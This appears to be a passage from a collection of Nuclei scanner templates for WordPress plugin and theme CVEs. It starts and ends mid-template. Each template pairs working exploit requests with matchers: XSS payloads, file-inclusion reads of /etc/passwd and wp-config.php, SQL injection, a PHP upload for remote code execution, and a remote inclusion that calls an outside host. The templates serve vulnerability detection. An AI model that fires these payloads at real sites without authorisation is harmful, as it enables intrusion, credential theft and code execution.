
- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/ultimate-weather-plugin/magpierss/scripts/magpie_debug.php?url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. ">\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Import Legacy Media \<= 0.1 - Cross-Site Scripting

## Description

- A cross-site scripting vulnerability in the Import Legacy Media plugin 0.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the filename parameter to getid3/demos/demo.mimeonly.php.
- severity - medium
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,xss,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/import-legacy-media/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. '>\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Podcast Channels \< 0.28 - Cross-Site Scripting

## Description

- The Podcast Channels WordPress plugin was affected by an unauthenticated reflected cross-site scripting security vulnerability.
- severity - medium
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,xss,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/podcast-channels/getid3/demos/demo.write.php?Filename=Filename%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Shortcode Ninja \<= 1.4 - Cross-Site Scripting

## Description

- A cross-site scripting vulnerability in preview-shortcode-external.php in the Shortcode Ninja plugin 1.4 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the shortcode parameter.
- severity - medium
- tags - wordpress,wp-plugin,xss,wpscan,cve,cve2014,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/shortcode-ninja/preview-shortcode-external.php?shortcode=shortcode%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3e

### Matchers

**Type - word**

- words
  1. '>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress EasyCart \<2.0.6 - Information Disclosure

## Description

- WordPress EasyCart plugin before 2.0.6 contains an information disclosure vulnerability. An attacker can obtain configuration information via a direct request to inc/admin/phpinfo.php, which calls the phpinfo function.

- severity - low
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,wp,phpinfo,disclosure

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wp-easycart/inc/admin/phpinfo.php

### Matchers

**Type - word**

- part - body
- words
  1. PHP Extension
  2. PHP Version
- condition - and

**Type - status**

- status
  1. 200

### Extractors

**Type - regex**

- part - body
- group - 1
- regex
  1. > PHP Version \<\/td>\<td class="v">([0-9.]+)

---

# Dompdf \< v0.6.0 - Local File Inclusion

## Description

- A vulnerability in dompdf.php in dompdf before 0.6.1, when DOMPDF_ENABLE_PHP is enabled, allows context-dependent attackers to bypass chroot protections and read arbitrary files via a PHP protocol and wrappers in the input_file parameter, as demonstrated by a php://filter/read=convert.base64-encode/resource in the input_file parameter.

- severity - high
- tags - cve,lfi,wp-plugin,wpscan,cve2014,dompdf,wordpress,wp,edb,seclists

## Requests

- Method - GET

### URL

- {{BaseURL}}/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/web-portal-lite-client-portal-secure-file-sharing-private-messaging/includes/libs/pdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/buddypress-component-stats/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/abstract-submission/dompdf-0.5.1/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/post-pdf-export/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/blogtopdf/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/gboutique/library/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd
- {{BaseURL}}/wp-content/plugins/wp-ecommerce-shop-styling/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - word**

- words
  1. application/pdf
  2. filename="dompdf_out.pdf"
- part - header
- condition - and

**Type - status**

- status
  1. 200

---

# Infusionsoft Gravity Forms Add-on \< 1.5.7 - Cross-Site Scripting

## Description

- Multiple cross-site scripting vulnerabilities in tests/notAuto_test_ContactService_pauseCampaign.php in the Infusionsoft Gravity Forms plugin before 1.5.6 for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) go, (2) contactId, or (3) campaignId parameter.
- severity - medium
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,xss,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/infusionsoft/Infusionsoft/tests/notAuto_test_ContactService_pauseCampaign.php?go=go%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&contactId=contactId%27%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&campaignId=campaignId%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&

### Matchers

**Type - word**

- words
  1. ">\</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress DB Backup \<=4.5 - Local File Inclusion

## Description

- WordPress Plugin DB Backup 4.5 and possibly prior versions are prone to a local file inclusion vulnerability because they fail to sufficiently sanitize user-supplied input. Exploiting this issue can allow an attacker to obtain sensitive information that could aid in further attacks.

- severity - high
- tags - lfi,cve,cve2014,wordpress,wp-plugin,wp,backup,wpscan,edb

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# Frontend Uploader \<= 0.9.2 - Cross-Site Scripting

## Description

- The Frontend Uploader WordPress plugin prior to v.0.9.2 was affected by an unauthenticated Cross-Site Scripting security vulnerability.
- severity - medium
- tags - wp-plugin,xss,wpscan,packetstorm,cve,cve2014,wordpress,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/?page_id=0&&errors[fu-disallowed-mime-type][0][name]=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Movies \<= 0.6 - Cross-Site Scripting

## Description

- A cross-site scripting vulnerability in the Movies plugin 0.6 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the filename parameter to getid3/demos/demo.mimeonly.php.
- severity - medium
- tags - wordpress,wp-plugin,xss,wpscan,cve,cve2014,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/movies/getid3/demos/demo.mimeonly.php?filename=filename%27%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&

### Matchers

**Type - word**

- words
  1. '>\<script>alert(document.cookie)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WooCommerce Swipe \<= 2.7.1 - Cross-Site Scripting

## Description

- A cross-site scripting vulnerability in test-plugin.php in the Swipe Checkout for WooCommerce plugin 2.7.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the api_url parameter.
- severity - medium
- tags - wpscan,cve,cve2014,wordpress,wp-plugin,xss,woocommerce,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/swipehq-payment-gateway-woocommerce/test-plugin.php?api_url=api_url%27%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E

### Matchers

**Type - word**

- words
  1. '>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WP Planet \<= 0.1 - Cross-Site Scripting

## Description

- A cross-site scripting vulnerability in rss.class/scripts/magpie_debug.php in the WP-Planet plugin 0.1 and earlier for WordPress allows remote attackers to inject arbitrary web script or HTML via the url parameter.
- severity - medium
- tags - cve2014,wordpress,wp-plugin,xss,wpscan,cve,unauth

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/wp-planet/rss.class/scripts/magpie_debug.php?url=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Sniplets \<=1.2.2 - Cross-Site Scripting

## Description

- WordPress Sniplets 1.1.2 and 1.2.2 plugin contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary web script or HTML via the text parameter to warning.php, notice.php, and inset.php in view/sniplets/, and possibly modules/execute.php; via the url parameter to view/admin/submenu.php; and via the page parameter to view/admin/pager.php.

- severity - high
- tags - xss,wp-plugin,wp,edb,wpscan,cve,cve2008,wordpress,sniplets

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Sniplets 1.1.2 - Local File Inclusion

## Description

- PHP remote file inclusion vulnerability in modules/syntax_highlight.php in the Sniplets 1.1.2 and 1.2.2 plugin for WordPress allows remote attackers to execute arbitrary PHP code via a URL in the libpath parameter.

- severity - high
- tags - lfi,cve,cve2008,wordpress,wp-plugin,wp,sniplets,edb,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/sniplets/modules/syntax_highlight.php?libpath=../../../../wp-config.php

### Matchers

**Type - word**

- part - body
- words
  1. DB_NAME
  2. DB_PASSWORD
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress WebP Converter for Media \< 4.0.3 - Unauthenticated Open Redirect

## Description

- WordPress WebP Converter for Media \< 4.0.3 contains a file (passthru.php) which does not validate the src parameter before redirecting the user to it, leading to an open redirect issue.
- severity - medium
- tags - redirect,wp-plugin,webpconverter,wpscan,cve,cve2021,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/webp-converter-for-media/includes/passthru.php?src=https://interact.sh

### Matchers

**Type - regex**

- part - header
- regex
  1. (?m)^(?:Location\s*?:\s*?)(?:https?:\/\/|\/\/|\/\\\\|\/\\)?(?:[a-zA-Z0-9\-_\.@]_)interact\.sh\/?(\/|[^.]._)?$

---

# WooCommerce PDF Invoices & Packing Slips WordPress Plugin \< 2.10.5 - Cross-Site Scripting

## Description

- The Wordpress plugin WooCommerce PDF Invoices & Packing Slips before 2.10.5 does not escape the tab and section parameters before reflecting it an attribute, leading to a reflected cross-site scripting in the admin dashboard.
- severity - medium
- tags - cve,cve2021,xss,wp,wordpress,wp-plugin,authenticated,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=wpo_wcpdf_options_page&section=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29+x%3D HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. " style=animation-name:rotation onanimationstart=alert(document.domain) x
  2. WooCommerce PDF Invoices
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Goto Tour & Travel Theme \<2.0 - Cross-Site Scripting

## Description

- WordPress Goto Tour & Travel theme before 2.0 contains an unauthenticated reflected cross-site scripting vulnerability. It does not sanitize the keywords and start_date GET parameters on its Tour List page.
- severity - medium
- tags - xss,wp-theme,wpscan,cve,cve2021,wordpress

## Requests

- Method - GET

### URL

- {{BaseURL}}/tour-list/?keywords=%3Cinput%2FAutofocus%2F%250D\*%2FOnfocus%3Dalert%28123%29%3B%3E&start_date=xxxxxxxxxxxx&avaibility=13

### Matchers

**Type - word**

- words
  1. input/Autofocus/%0D\*/Onfocus=alert(123);
  2. goto-tour-list-js-extra
- part - body
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress MF Gig Calendar \<=1.1 - Cross-Site Scripting

## Description

- WordPress MF Gig Calendar plugin 1.1 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize or escape the id GET parameter before outputting back in the admin dashboard when editing an event.
- severity - medium
- tags - wp-plugin,authenticated,wpscan,wordpress,cve,cve2021

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=mf_gig_calendar&action=edit&id="></script><script>alert(document.domain)</script><" HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. text/html

---

# WordPress OpenID Connect Generic Client 3.8.0-3.8.1 - Cross-Site Scripting

## Description

- WordPress OpenID Connect Generic Client plugin 3.8.0 and 3.8.1 contains a cross-site scripting vulnerability. It does not sanitize the login error when output back in the login form, thereby not requiring authentication, which can be exploited with the default configuration.
- severity - medium
- tags - wpscan,cve,cve2021,wordpress,xss,wp-plugin,wp,openid

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-login.php?login-error=\<script>alert(document.domain)\</script>

### Matchers

**Type - word**

- part - body
- words
  1. ERROR (\<script>alert(document.domain)\</script>):
  2. Login with OpenID Connect
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Ocean Extra \<1.9.5 - Cross-Site Scripting

## Description

- WordPress Ocean Extra plugin before 1.9.5 contains a cross-site scripting vulnerability. The plugin does not escape generated links which are then used when the OceanWP theme is active.
- severity - medium
- tags - cve,cve2021,wordpress,xss,wp-plugin,authenticated,wpscan,wp,ocean-extra

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/?step=demo&page=owp_setup&a"><script>alert(/XSS/)</script>   HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. OceanWP
  2. > \<script>alert(/XSS/)\</script>
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# Patreon WordPress \< 1.7.0 - Unauthenticated Local File Disclosure

## Description

- The Jetpack Scan team identified a Local File Disclosure vulnerability in the Patreon WordPress plugin before 1.7.0 that could be abused by anyone visiting the site. Using this attack vector, an attacker could leak important internal files like wp-config.php, which contains database credentials and cryptographic keys used in the generation of nonces and cookies.
- severity - high
- tags - wordpress,patreon-connect,unauth,cve2021,lfi,patreon,wp,wpscan,cve

## Requests

- Method - GET

### URL

- {{BaseURL}}/?patron_only_image=../../../../../../../../../../etc/passwd&patreon_action=serve_patron_only_image

### Matchers

**Type - regex**

- regex
  1. root:[x*]:0:0

**Type - status**

- status
  1. 200

---

# WordPress Car Seller - Auto Classifieds Script - SQL Injection

## Description

- The request_list_request AJAX call of the Car Seller - Auto Classifieds Script WordPress plugin through 2.1.0, available to both authenticated and unauthenticated users, does not sanitize, validate or escape the order_id POST parameter before using it in a SQL statement, leading to a SQL injection issue.
- severity - critical
- tags - cve2021,wordpress,wp-plugin,sqli,wpscan,cve

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

action=request_list_request&order_id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a767671,0x685741416c436654694d446d416f717a6b54704a457a5077564653614970664166646654696e724d,0x7171786b71),NULL-- -

```

### Matchers

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. qzvvqhWAAlCfTiMDmAoqzkTpJEzPwVFSaIpfAfdfTinrMqqxkq
- part - body

---

# WordPress Jannah Theme \<5.4.4 - Cross-Site Scripting

## Description

- WordPress Jannah theme before 5.4.4 contains a reflected cross-site scripting vulnerability. It does not properly sanitize the options JSON parameter in its tie_get_user_weather AJAX action before outputting it back in the page.
- severity - medium
- tags - cve,cve2021,wordpress,xss,wp-theme,wpscan

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Post Grid \<2.1.8 - Cross-Site Scripting

## Description

- WordPress Post Grid plugin before 2.1.8 contains a reflected cross-site scripting vulnerability. The slider import search feature and tab parameter of thesettings are not properly sanitized before being output back in the pages,
- severity - medium
- tags - authenticated,wpscan,cve,cve2021,xss,wp,wordpress,wp-plugin

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/edit.php?post_type=post_grid&page=import_layouts&keyword="onmouseover=alert(document.domain)// HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. value="\"onmouseover=alert(document.domain)/">
  2. Post Grid
- condition - and

**Type - status**

- status
  1. 200

---

# WordPress Workreap - Remote Code Execution

## Description

- WordPress Workreap theme is susceptible to remote code execution. The AJAX actions workreap_award_temp_file_uploader and workreap_temp_file_uploader did not perform nonce checks, or validate that the request is from a valid user in any other way. The endpoints allowed for uploading arbitrary files to the uploads/workreap-temp directory. Uploaded files were neither sanitized nor validated, allowing an unauthenticated visitor to upload executable code such as php scripts.
- severity - critical
- tags - cve,cve2021,rce,workreap,wpscan,wordpress,wp-plugin,intrusive,wp

## Requests

### Step - 1

```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=------------------------cd0dc6bdc00b1cf9
X-Requested-With: XMLHttpRequest

-----------------------------cd0dc6bdc00b1cf9
Content-Disposition: form-data; name="action"

workreap_award_temp_file_uploader
-----------------------------cd0dc6bdc00b1cf9
Content-Disposition: form-data; name="award_img"; filename="{{randstr}}.php"
Content-Type: application/x-httpd-php

<?php echo md5("CVE-2021-24499"); ?>
-----------------------------cd0dc6bdc00b1cf9--

```

### Step - 2

```
GET /wp-content/uploads/workreap-temp/{{randstr}}.php HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. 71abe5077dae2754c36d731cc1534d4d

**Type - status**

- status
  1. 200

---

# WordPress Button Generator \<2.3.3 - Remote File Inclusion

## Description

- WordPress Button Generator before 2.3.3 within the wow-company admin menu page allows arbitrary file inclusion with PHP extensions (as well as with data:// or http:// protocols), thus leading to cross-site request forgery and remote code execution.
- severity - high
- tags - wp-plugin,authenticated,wpscan,cve,cve2021,rfi,wp,wordpress

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=wow-company&tab=http://{{interactsh-url}}/ HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - interactsh_protocol
- name - http
- words
  1. http

**Type - status**

- status
  1. 200

---

# WPS Hide Login \< 1.9.1 - Protection Bypass with Referer-Header

## Description

- The plugin has a bug which allows to get the secret login page by setting a random referer string and making a request to /wp-admin/options.php as an unauthenticated user.
- severity - high
- tags - cve2021,wp,wordpress,wp-plugin,unauth,wpscan,cve

## Requests

### Step - 1

```
GET /wp-admin/options.php HTTP/1.1
Host: {{Hostname}}
Referer: something

```

### Matchers

**Type - word**

- part - header
- words
  1. redirect_to=%2Fwp-admin%2Fsomething&reauth=1

**Type - dsl**

- dsl
  1. !contains(tolower(location), 'wp-login.php')

### Extractors

**Type - kval**

- kval
  1. location

---

# WordPress Visitor Statistics (Real Time Traffic) \<4.8 -SQL Injection

## Description

- WordPress Visitor Statistics (Real Time Traffic) plugin before 4.8 does not properly sanitize and escape the refUrl in the refDetails AJAX action, which is available to any authenticated user. This could allow users with a role as low as subscriber to perform SQL injection attacks.
- severity - high
- tags - authenticated,wpscan,cve,cve2021,sqli,wp,wordpress,wp-plugin

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin-ajax.php?action=refDetails&requests=%7B%22refUrl%22:%22'%20union%20select%201,1,md5({{num}}),4--%20%22%7D HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. {{md5({{num}})}}

**Type - status**

- status
  1. 200

---

# WordPress Elementor Website Builder \<3.1.4 - Cross-Site Scripting

## Description

- WordPress Elementor Website Builder plugin before 3.1.4 contains a DOM cross-site scripting vulnerability. It does not sanitize or escape user input appended to the DOM via a malicious hash.

- severity - medium
- tags - wordpress,wp-plugin,elementor,wpscan,cve,cve2021,dom,xss

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-content/plugins/elementor/assets/js/frontend.min.js
- {{BaseURL}}/#elementor-action:action=lightbox&settings=eyJ0eXBlIjoibnVsbCIsImh0bWwiOiI8c2NyaXB0PmFsZXJ0KCd4c3MnKTwvc2NyaXB0PiJ9

### Matchers

**Type - regex**

- part - body_1
- regex
  1. elementor[\s-]\*v(([0-3]+\.(([0-5]+\.[0-5]+)|[0-4]+\.[0-9]+))|[0-2]+[0-9.]+)

**Type - dsl**

- dsl
  1. compare_versions(version, '> 1.5.0', '\< 3.1.4') && status_code_1 == 200 && status_code_2 == 200

### Extractors

**Type - regex**

- name - version
- group - 1
- regex
  1. elementor[\s-]\*v(([0-3]+\.(([0-5]+\.[0-5]+)|[0-4]+\.[0-9]+))|[0-2]+[0-9.]+)
- internal - True

**Type - kval**

- kval
  1. version

---

# WordPress Duplicate Page or Post \<1.5.1 - Cross-Site Scripting

## Description

- WordPress Duplicate Page or Post plugin before 1.5.1 contains a stored cross-site scripting vulnerability. The plugin does not have any authorization and has a flawed cross-site request forgery check in the wpdevart_duplicate_post_parametrs_save_in_db AJAX action, allowing unauthenticated users to call it and change the plugin's settings, or perform such attack via cross-site request forgery.

- severity - low
- tags - wpscan,cve,cve2021,wordpress,xss,wp-plugin,authenticated

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

action=wpdevart_duplicate_post_parametrs_save_in_db&title_prefix=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28%2fXSS%2f%29+p

```

### Step - 3

```
GET /wp-admin/admin.php?page=wpda_duplicate_post_menu HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. style=animation-name:rotation onanimationstart=alert(/XSS/) p
  2. toplevel_page_wpda_duplicate_post_menu
- condition - and

**Type - word**

- part - header
- words
  1. text/html

**Type - status**

- status
  1. 200

---

# WordPress Quiz and Survey Master \<7.1.14 - Cross-Site Scripting

## Description

- WordPress Quiz and Survey Master plugin prior to 7.1.14 contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary script via unspecified vectors.
- severity - medium
- tags - wordpress,cve,cve2021,wp-plugin,authenticated,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php?page=mlw_quiz_list&s="></script><script>alert(document.domain)</script>&paged="></script><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. text/html

---

# WordPress Easy Social Icons Plugin \< 3.0.9 - Cross-Site Scripting

## Description

- The Easy Social Icons plugin \<= 3.0.8 for WordPress echoes out the raw value of `$_SERVER['PHP_SELF']` in its main file. On certain configurations including Apache+modPHP this makes it possible to use it to perform a reflected cross-site scripting attack by injecting malicious code in the request path.
- severity - medium
- tags - wordpress,cve,cve2021,wp-plugin,authenticated,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```

### Step - 2

```
GET /wp-admin/admin.php/</script><script>alert(document.domain)</script>/?page=cnss_social_icon_page HTTP/1.1
Host: {{Hostname}}

```

### Matchers

**Type - word**

- part - body
- words
  1. \</script>\<script>alert(document.domain)\</script>

**Type - status**

- status
  1. 200

**Type - word**

- part - header
- words
  1. text/html

---

# WordPress Supsystic Contact Form \<1.7.15 - Cross-Site Scripting

## Description

- WordPress Supsystic Contact Form plugin before 1.7.15 contains a cross-site scripting vulnerability. It does not sanitize the tab parameter of its options page before outputting it in an attribute.
- severity - medium
- tags - wordpress,cve,cve2021,wp-plugin,wpscan,packetstorm

## Requests

- Method - GET

### URL

- {{BaseURL}}/wp-admin/admin.php?page=contact-form-supsystic&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

### Matchers

**Type - word**

- words
  1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - status**

- status
  1. 200

**Type - word**

- words
  1. text/html
- part - header

---

# WordPress Contact Form 7 \<2.3.4 - Arbitrary Nonce Generation

## Description

- WordPress Contact Form 7 before version 2.3.4 allows unauthenticated users to use the wpcf7r_get_nonce AJAX action to retrieve a valid nonce for any WordPress action/function.
- severity - high
- tags - wordpress,wp-plugin,wpscan,cve,cve2021

## Requests

- Method - POST
- Method - POST

### URL

- {{BaseURL}}/wp-admin/admin-ajax.php
  - action=wpcf7r_get_nonce&param=wp_rest

### Matchers

**Type - status**

- status
  1. 200

**Type - regex**

- part - body
- regex
  1. "success":true
  2. "nonce":"[a-f0-9]+"
- condition - and

### Extractors

**Type - regex**

- part - body
- regex
  1. "nonce":"[a-f0-9]+"

---

# WordPress iQ Block Country \<=1.2.11 - Cross-Site Scripting

## Description

- WordPress iQ Block Country plugin 1.2.11 and prior contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - medium
- tags - cve,wp-plugin,iq-block-country,cve2021,wordpress,wp,xss,authenticated,wpscan

## Requests

### Step - 1

```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

```

### Step - 2

```
GET /wp-admin/options-general.php?page=iq-block-country%2Flibs%2Fblockcountry-settings.php HTTP/1.1
Host: {{Hostname}}

```

### Step - 3

```
POST /wp-admin/options.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

